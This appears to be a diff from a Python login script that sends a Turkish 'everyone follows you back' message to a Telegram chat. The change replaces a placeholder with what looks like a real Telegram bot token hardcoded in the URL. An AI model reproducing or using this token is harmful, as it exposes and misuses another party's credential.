@@ -42,7 +42,7 @@ def do_login():
             message = "Herkes seni geri takip ediyor!"
 
         requests.post(
-            f"https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage",
+            f"https://api.telegram.org/bot7826510525:AAETKgNWahBzWWa4FRRkCnit4QaByYFjHYc/sendMessage",
             data={"chat_id": chat_id, "text": message}
         )
 
